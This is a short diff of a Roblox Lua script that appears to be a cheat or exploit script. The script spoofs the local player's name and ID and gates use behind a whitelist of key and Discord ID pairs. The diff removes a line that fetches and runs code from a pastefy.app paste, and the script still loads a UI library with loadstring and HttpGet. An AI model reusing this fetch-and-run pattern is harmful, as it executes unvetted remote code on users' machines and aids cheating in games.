@@ -1,6 +1,5 @@
 game.Players.LocalPlayer.Name = "mygame43"
 game.Players.LocalPlayer.UserId = "912348"
-loadstring(game:HttpGet("https://pastefy.app/nTehfRWs/raw"))()
 
 local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
 OrionLib:MakeNotification({
@@ -64,17 +63,14 @@ local keylist = {
     "TYARWSRP:1092404057748029603",
     "VDYSUVSY:1107527138481016903"
 }
-
 local found = false
 local AfxcaxiRoblox = _G.AFXKey .. ":" .. _G.AFXDiscordID
-
 for _, v in ipairs(keylist) do
     if AfxcaxiRoblox == v then
         found = true
         break
     end
 end
-
 if found then
     print("Whitelisting...")
     print("Correct Key and Discord ID")
